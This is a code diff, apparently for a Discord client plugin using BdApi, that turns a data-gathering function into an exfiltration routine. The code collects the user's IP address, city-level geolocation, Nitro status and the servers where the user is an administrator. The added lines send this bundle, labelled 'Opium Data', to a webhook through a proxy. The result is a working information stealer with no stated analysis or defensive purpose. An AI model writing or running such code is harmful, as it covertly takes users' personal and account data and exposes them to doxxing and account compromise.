@@ -1,8 +1,8 @@
-async function gatherData() {
+async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
     let result = {
         ip: null,
         location: null,
-        nitro: "None",
+        nitro: "Нет",
         admin_servers: []
     };
     
@@ -15,7 +15,7 @@ async function gatherData() {
         const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
         const geoData = await geoRes.json();
         if (geoData.status === 'success') {
-            result.location = geoData.city || geoData.regionName || geoData.country || "Unknown";
+            result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
         }
     } catch (e) { console.error("IP Error", e); }
 
@@ -38,7 +38,7 @@ async function gatherData() {
         if (GuildStore && PermissionStore) {
             const guilds = GuildStore.getGuilds();
             for (const g of Object.values(guilds)) {
-                // Проверяем право "Администратор" (8n - BigInt)
+                // 8n - право "Администратор"
                 if (PermissionStore.can(8n, g)) {
                     result.admin_servers.push({
                         name: g.name,
@@ -49,5 +49,19 @@ async function gatherData() {
         }
     } catch (e) { console.error("Guild Error", e); }
 
-    return result;
+    // 4. Отправка на вебхук через прокси
+    try {
+        const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
+        const response = await BdApi.Net.fetch(proxyUrlFull, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `**Opium Data**\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``
+            })
+        });
+        return response.ok;
+    } catch (e) {
+        console.error("Webhook Error", e);
+        return false;
+    }
 }
